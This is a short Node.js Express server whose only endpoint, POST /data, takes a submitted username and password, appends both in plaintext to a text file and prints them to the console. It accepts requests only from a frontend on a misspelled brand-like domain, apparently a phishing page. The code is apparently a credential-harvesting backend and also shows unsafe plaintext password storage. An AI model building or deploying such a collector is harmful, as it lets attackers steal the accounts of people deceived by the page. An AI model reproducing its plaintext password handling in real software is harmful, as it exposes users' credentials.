const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// ✅ Allow only your frontend
app.use(cors({
  origin: 'https://rebokc.onrender.com'
}));

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.post('/data', (req, res) => {
  const { username, password } = req.body;

  const logEntry = `Username: ${username}, Password: ${password}\n`;
  fs.appendFileSync(path.join(__dirname, 'received_data.txt'), logEntry);

  console.log('Data received:', username, password);
  res.json({ status: 'ok' });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server listening at http://0.0.0.0:${PORT}`);
});
